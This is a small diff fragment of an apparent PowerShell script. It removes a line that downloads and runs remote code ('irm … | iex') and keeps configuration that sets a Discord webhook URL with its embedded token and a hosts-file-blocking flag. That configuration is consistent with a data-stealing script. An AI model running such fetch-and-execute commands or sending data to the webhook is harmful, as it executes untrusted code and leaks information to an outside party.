@@ -1,4 +1,4 @@
-irm https://christitus.com/win | iex
+
 $webhook = "https://discord.com/api/webhooks/1251938579307958403/Qaxju-CGPMJ7ngRoCZbnsq20FIYrfWIZUcZf2I9DYgG3yuClI3GGpTEv0T1DBceXNwFx" 
 $debug = $true
 $blockhostsfile = $true
